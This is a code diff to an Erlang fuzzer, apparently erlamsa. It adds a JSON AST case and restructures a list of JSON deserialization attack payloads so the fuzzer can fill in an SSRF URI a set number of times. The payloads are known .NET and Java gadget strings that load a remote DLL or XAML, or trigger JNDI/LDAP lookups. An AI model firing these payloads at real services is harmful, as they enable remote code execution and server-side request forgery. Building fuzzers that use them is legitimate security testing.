@@ -244,6 +244,8 @@ fold_ast({pair, P1, P2}, Acc) ->
     P1Json = fold_ast(P1, []),
     P2Json = fold_ast(P2, []),
     [P1Json, ":", P2Json | Acc];
+fold_ast({junkstring, Value}, Acc) -> 
+    [$", Value, $" | Acc];
 fold_ast({string, Value}, Acc) -> 
     [$", Value, $" | Acc];
 fold_ast({constant, Value}, Acc) when is_atom(Value) -> 
@@ -582,19 +584,19 @@ json_insert(Ast, N) ->
 %% Beginning of payloads from upper links.
 json_unserialize_bugs() ->
 [
-"{\"__type\":\"System.Windows.Application, PresentationFramework,Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\",\"Resources\":{\"__type\":\"System.Windows.ResourceDictionary,PresentationFramework, Version=4.0.0.0, Culture=neutral,PublicKeyToken=31bf3856ad364e35\",\"Source\":\"http~sJsonDotNet/Xamlpayload\"}}",
-"{\"$type\":\"System.Configuration.Install.AssemblyInstaller,System.Configuration.Install, Version=4.0.0.0, Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a\",\"Path\":\"http~sJsonDotNet/RemoteLibrary.dll\"}",
-"{\"$type\":\"System.Windows.Forms.BindingSource, System.Windows.Forms,Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\"DataMember\":\"HelpText\",\"dataSource\":{\"$type\":\"System.Configuration.Install.AssemblyInstalle r, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\",\"Path\":\"http~sJsonDotNet/RemoteLibrary.dll\"}}",
-"{\"@class\":\"org.hibernate.jmx.StatisticsService\",\"sessionFactoryJNDIN ame\":\"ldap~suid=somename,ou=someou,dc=somedc\"}",
-"{\"@class\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"ldap:~suid=somename,ou=someou,dc=somed c\", \"autoCommit\":true}",
-"{\"@class\":\" com.atomikos.icatch.jta.RemoteClientUserTransaction\", \"name_\":\"ldap~suid=somename,ou=someou,dc=somedc\", \"providerUrl_\":\"ldap://~s\"}"
+{"{\"__type\":\"System.Windows.Application, PresentationFramework,Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\",\"Resources\":{\"__type\":\"System.Windows.ResourceDictionary,PresentationFramework, Version=4.0.0.0, Culture=neutral,PublicKeyToken=31bf3856ad364e35\",\"Source\":\"http~sJsonDotNet/Xamlpayload\"}}",1},
+{"{\"$type\":\"System.Configuration.Install.AssemblyInstaller,System.Configuration.Install, Version=4.0.0.0, Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a\",\"Path\":\"http~sJsonDotNet/RemoteLibrary.dll\"}",1},
+{"{\"$type\":\"System.Windows.Forms.BindingSource, System.Windows.Forms,Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\"DataMember\":\"HelpText\",\"dataSource\":{\"$type\":\"System.Configuration.Install.AssemblyInstalle r, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\",\"Path\":\"http~sJsonDotNet/RemoteLibrary.dll\"}}",1},
+{"{\"@class\":\"org.hibernate.jmx.StatisticsService\",\"sessionFactoryJNDIName\":\"ldap~suid=somename,ou=someou,dc=somedc\"}",1},
+{"{\"@class\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"ldap:~suid=somename,ou=someou,dc=somed c\", \"autoCommit\":true}",1},
+{"{\"@class\":\" com.atomikos.icatch.jta.RemoteClientUserTransaction\", \"name_\":\"ldap~suid=somename,ou=someou,dc=somedc\", \"providerUrl_\":\"ldap~s\"}",2}
 ].
 %% /End of payloads from upper links.
 
 make_json_unserialize() ->
     Uri = lists:flatten(erlamsa_mutations:get_ssrf_uri()),
-    Payload = erlamsa_rnd:rand_elem(json_unserialize_bugs()),
-    list_to_binary(lists:flatten(io_lib:format(Payload, [Uri]))).
+    {Payload, Repeats} = erlamsa_rnd:rand_elem(json_unserialize_bugs()),
+    list_to_binary(lists:flatten(io_lib:format(Payload, [Uri || _ <- lists:seq(1,Repeats)]))).
 
 mutate_innertext_prob(String, _Muta, Prob, Rnd) when Rnd > Prob ->
     {[], String}; %% No mutations
